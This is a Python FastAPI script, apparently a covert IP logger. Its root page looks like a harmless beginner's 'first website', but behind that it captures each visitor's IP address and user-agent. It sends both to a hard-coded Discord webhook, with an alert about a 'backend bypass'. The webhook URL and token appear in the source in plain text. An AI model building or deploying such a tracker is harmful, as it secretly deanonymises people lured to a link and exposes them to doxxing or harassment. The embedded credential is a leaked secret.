from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import httpx

app = FastAPI()

# 본인의 디스코드 웹훅 URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1554079546448285738/bPvvBD1kInPi0nVVwC1y9rMM1RUo3aApOciZMQyGjx1Sa0Aids9GLlCPfJ9B_nRpGx3-"

@app.get("/", response_class=HTMLResponse)
async def log_ip(request: Request):
    # 클라우드 환경(Render)에서 방문자의 실제 IP 주소 추출
    client_ip = request.headers.get("x-forwarded-for")
    if client_ip:
        # 여러 프록시 IP가 쉼표로 연결되어 올 수 있으므로 첫 번째 IP만 추출
        client_ip = client_ip.split(",")[0].strip()
    else:
        client_ip = request.client.host

    # 접속 기기 정보 추출
    user_agent = request.headers.get("user-agent", "알 수 없음")

    # 디스코드 전송 메시지 구성
    payload = {
        "content": f"🚨 **새로운 방문자 발생 (백엔드 우회 완료)**\n- **IP 주소:** `{client_ip}`\n- **접속 환경:** `{user_agent}`"
    }

    # 디스코드 웹훅 전송
    async with httpx.AsyncClient() as client:
        try:
            await client.post(DISCORD_WEBHOOK_URL, json=payload)
        except Exception as e:
            print(f"웹훅 전송 에러: {e}")

    # 방문자가 사이트에 접속했을 때 화면에 보여줄 HTML 내용
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>test site</title>
    </head>
    <body>
        <h1>첨으로 웹사이트 만듬ㅋ</h1>
    </body>
    </html>
    """
